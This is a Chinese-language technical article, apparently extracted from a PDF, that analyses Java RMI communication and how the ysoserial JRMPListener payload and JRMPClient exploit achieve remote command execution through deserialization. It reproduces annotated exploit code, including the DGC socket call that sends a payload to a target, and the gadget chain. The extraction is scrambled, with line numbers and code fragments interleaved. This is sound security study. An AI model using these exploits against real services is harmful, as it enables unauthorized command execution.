由于客户端通过RegistryImpl_Stub.lookup(String var1)⽅法调⽤时最终调⽤的是服务端的
RegistryImpl.lookup(String var1)，注意是RegistryImpl，也就是RegistryImpl_Skel 因此在服务
端的RegistryImpl.lookup(String var1)⽅法中下断点启动服务端，当运⾏客户端代码时，就会停
在该⽅法，如下：
此时调⽤栈如下
7.总结
1. Server端监听⼀个端⼝，这个端⼝是JVM随机选择的；
2. Client端并不知道Server远程对象的通信地址和端⼝，但是Stub中包含了这些信息，并封装
了底层⽹络操作；
3. Client端可以调⽤Stub上的⽅法；
4. Stub连接到Server端监听的通信端⼝并提交参数；
5. 远程Server端上执⾏具体的⽅法，并返回结果给Stub；
6. Stub返回执⾏结果给Client端，从Client看来就好像是Stub在本地执⾏了这个⽅法⼀样；
通过对源码阅读，对 RMI 通信过程有了基本了解。⼤致流程：服务端调⽤ bind ⽅法会在注册
中⼼注册服务。客户端⾸先和注册中⼼通信，通过 lookup ⽅法从注册服务（存储
在 Hashtable 中）获取到代理对象，客户端根据代理对象信息和服务端建⽴新的通信。服务端
通过反射执⾏本地⽅法将结果返回给客户端。
主要涉及类：
 \java\rmi\registry\LocateRegistry.java
 \sun\rmi\registry\RegistryImpl.class // 根据端⼝⽣成 LiveRef、UnicastServerRef 对
象，并调⽤ setup ⽅法
 \sun\rmi\server\UnicastServerRef.class // 存储封装的 LiveRef 对象,创建 Skeleton 对
象
 \sun\rmi\server\UnicastRef.class // 存储封装的 LiveRef 对象,远程⽅法调⽤时通过此类 
invoke ⽅法调⽤并获取结果
 \sun\rmi\transport\LiveRef.class  // 存储封装的 ObjID 对象和 TCPEndpoint 对象信息
 \sun\rmi\transport\tcp\TCPEndpoint.class  // 存储 host、port、csf、ssf 等信息
 \sun\rmi\transport\tcp\TCPTransport.class  // ServerSocket 多线程获取连接并处理请
求
 \sun\rmi\registry\RegistryImpl_Skel.class  // 根据 TCPTransport 连接请求调⽤ 
dispatch ⽅法做相应的处理
 \sun\rmi\registry\RegistryImpl_Stub.class  // LocateRegistry.createRegistry(1099); 返
回对象，调⽤ bind、list、lookup 等⽅法
通过注册中⼼和服务端的通信可以看到：
1、服务端往 socket 中写⼊序列化数据时，注册中⼼对⽤ case ⼀定会做反序列化处理；
2、注册中⼼往 socket 中写⼊序列化数据时，服务端也⼀定会做反序列化处理；
得出两个结论：
1、我们可以通过不同的⽅法构造⾃⼰的 socket 通信；
2、如果注册中⼼为靶机服务，服务端为攻击端，使⽤原⽣的 RMI 通信会有反被打的可能。
RMI 反序列化
在源码中可以看到注册中⼼、服务端、客户端三者之间通信都会涉及序列化传输⼆进制数据。所
以我们可以根据 RMI 的通信流程构造⾃⼰的请求和靶机通信，也能避免被反打的可能。
ysoserial 项⽬中 JRMPListener 利⽤模块正是重写了 RMI 通信的逻辑。
三、yso⾥⾯关于rmi的payload
1.ysoserial payloads/JRMPLIstener exploit 
JRMPClient/RMIRegistryExploit原理剖析
1) 攻击流程：
1、先往存在漏洞的服务器发送payloads/JRMPLIstener，使服务器反序列化该payload后，会
开启⼀个rmi服务并监听在设置的端⼝
2、然后攻击⽅在⾃⼰的服务器使⽤exploit/JRMPClient与存在漏洞的服务器进⾏通信，并且发
送⼀个可命令执⾏的payload（假如存在漏洞的服务器中有使⽤
org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从
⽽达到命令执⾏的结果。
2) 为什么第⼀步payload发过去被反序列化后，⽬标会启动⼀个RMI服务呢？
看⼀下payloads/JRMPLIstener的代码
关键函数在Reﬂections.createWithConstructor⽅法
public class JRMPListener extends PayloadRunner implements 
ObjectPayload {
1
2
    public UnicastRemoteObject getObject(final String command) throws 
Exception {
3
        //设置jrmp监听端口
4
        int jrmpPort = Integer.parseInt(command);
5
        //调用RemoteObject类的构造方法，new UnicastServerRef(jrmpPort)作为构
造方法的参数，然后返回一个ActivationGroupImpl类型的对象
6
        UnicastRemoteObject uro = 
Reflections.createWithConstructor(ActivationGroupImpl.class, 
RemoteObject.class, new Class[]{
7
            RemoteRef.class
8
        }, new Object[]{
9
            new UnicastServerRef(jrmpPort)
10
        });
11
        //通过反射设置uro对象中的port属性值为jrmpPort
12
        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, 
jrmpPort);
13
        return uro;
14
    }
15
}
16
public static  T createWithConstructor ( Class classToInstantiate, 
Class constructorClass, Class[] consArgTypes, Object[] 
consArgs )
1
        throws NoSuchMethodException, InstantiationException, 
IllegalAccessException, InvocationTargetException {
2
    //获取constructorClass类的构造方法，从泛型限定来看，constructorClass为
classToInstantiate的父类
3
    Constructor objCons = 
constructorClass.getDeclaredConstructor(consArgTypes);
4
    setAccessible(objCons);
5
    //这里会根据constructorClass父类的构造方法新建一个构造方法，但使用该构造方法
newInstance出的对象为constructorClass类型
6
    Constructor sc = 
ReflectionFactory.getReflectionFactory().newConstructorForSerialization(cl
assToInstantiate, objCons);
7
    setAccessible(sc);
8
    //调用constructorClass父类的构造方法，将consArgs作为参数，返回
constructorClass类型的对象
9
通过以上代码的分析，最后知道了⽣成的payload对象为ActivationGroupImpl类型，并将其向上
转型为其⽗类UnicastRemoteObject类型。明⽩该payload怎么⽣成后，就该分析它的gadget链
了。
根据上述链去分析相应的代码
虽然⽣成的payload实际对象为ActivationGroupImpl类型，但其被向上转型为了
UnicastRemoteObject类型，所以在反序列化时⾃然会先执⾏UnicastRemoteObjec的
readObject⽅法，因此在该⽅法中下断点，如下：
跟⼊reexport()⽅法，可以看到执⾏到了如下位置
继续跟进，这⾥就很熟悉了，在前⼀篇调试RMI时，后⾯的流程已经⾛完了：（分析RMIServe
时
最终到了TCPTransport类的exportObject(Target var1)⽅法，如下，即开启了监听，只不过其
导出的对象为上述⽣成的payload本身⽽已
    return (T)sc.newInstance(consArgs);
10
}
11
Gadget chain:
1
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
2
 * UnicastRemoteObject.reexport() line: 266
3
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
4
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
5
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
6
 * LiveRef.exportObject(Target) line: 147
7
 * TCPEndpoint.exportObject(Target) line: 411
8
 * TCPTransport.exportObject(Target) line: 249
9
 * TCPTransport.listen() line: 319
10
到这⾥，就明⽩了如果服务端反序列化了该payload，即可开启rmi监听。
3) 接下来就可以分析第⼆步了
1.当使⽤RMIRegistryExploit攻击上述开启的监听 使⽤的是bind⽅式
2.当使⽤exploit/JRMPClient攻击 攻击的时DGC
1、攻击⽬标是远程DGC，也就是分布式垃圾收集，只要服务端有listener监听，就⼀定存在
DGC。
2、不反序列化任何数据，意思就是客户端不会接受任何服务端发送的数据，这样就避免了被对
⽅反过来进⾏攻击。
这⾥就先简单了解⼀下分布式垃圾收集
在Java虚拟机中，对于⼀个本地对象，只要不被本地Java虚拟机中的任何变量引⽤，它就可以
被垃圾回收器回收了。
⽽对于⼀个远程对象，不仅会被本地Java虚拟机中的变量引⽤还会被远程引⽤。如将远程对象
注册到Rregistry时，Registry注册表就会持有它的远程引⽤。
RMI框架采⽤分布式垃圾收集机制(DGC，Distributed Garbage Collection)来管理远程对象的⽣
命周期。DGC的主要规则是，只有当⼀个远程对象不受任何本地引⽤和远程引⽤，这个远程对
象才会结束⽣命周期。
当客户端获得了⼀个服务器端的远程对象存根时，就会向服务器发送⼀条租约通知，告诉服务器
⾃⼰持有这个远程对象的引⽤了。此租约有⼀个租约期限，租约期限可通过系统属性
java.rmi.dgc.leaseValue来设置，以毫秒为单位，其默认值为600 000毫秒。如果租约到期后服
务器端没有继续收到客户端新的租约通知，服务器端就会认为这个客户已经不再持有远程对象的
引⽤。
因此可以通过与DGC通信的⽅式发送恶意payload让服务端进⾏反序列化，从⽽执⾏任意命令。
下⾯是exploit/JRMPClient代码
下⾯就看主要的通信⽅法makeDGCCall了，其发送的通信数据在上⾯调试中均已发现其具体作
⽤，我也进⾏了注释：
public static final void main ( final String[] args ) {
1
        if ( args.length  
  ");
3
            System.exit(-1);
4
        }
5
        //生成指定的命令执行的payload
6
        Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
7
        String hostname = args[ 0 ];
8
        int port = Integer.parseInt(args[ 1 ]);
9
        try {
10
            System.err.println(String.format("* Opening JRMP socket 
%s:%d", hostname, port));
11
            //通信方法
12
            makeDGCCall(hostname, port, payloadObject);
13
        }
14
        catch ( Exception e ) {
15
            e.printStackTrace(System.err);
16
        }
17
        Utils.releasePayload(args[2], payloadObject);
18
    }
19
public static void makeDGCCall ( String hostname, int port, Object 
payloadObject ) throws IOException, UnknownHostException, SocketException 
{
1
        InetSocketAddress isa = new InetSocketAddress(hostname, port);
2
        Socket s = null;
3
        DataOutputStream dos = null;
4
        try {
5
            //创建与使用payloads/JRMPLIstener开启监听的rmi服务的Socket通信
6
            s = SocketFactory.getDefault().createSocket(hostname, port);
7
            s.setKeepAlive(true);
8
            s.setTcpNoDelay(true);
9
            //获取Socket的输出流
10
            OutputStream os = s.getOutputStream();
11
            //将输出流包装成DataOutputStream流对象
12
            dos = new DataOutputStream(os);
13
            //下面发送了三组数据，是在服务端TCPTransport类的handleMessages方法
调用前通信的数据
14
            dos.writeInt(TransportConstants.Magic); // 1246907721;
15
            dos.writeShort(TransportConstants.Version); // 2
16
JEP 290之后，对RMI注册表和分布式垃圾收集（DGC）新增了内置过滤器，以上攻击⽅式均失
效了。
2.ysoserial  payloads JRMPClient & exploit JRMPListener
⽹上常⻅的利⽤⽅式
            dos.writeByte(TransportConstants.SingleOpProtocol); // 76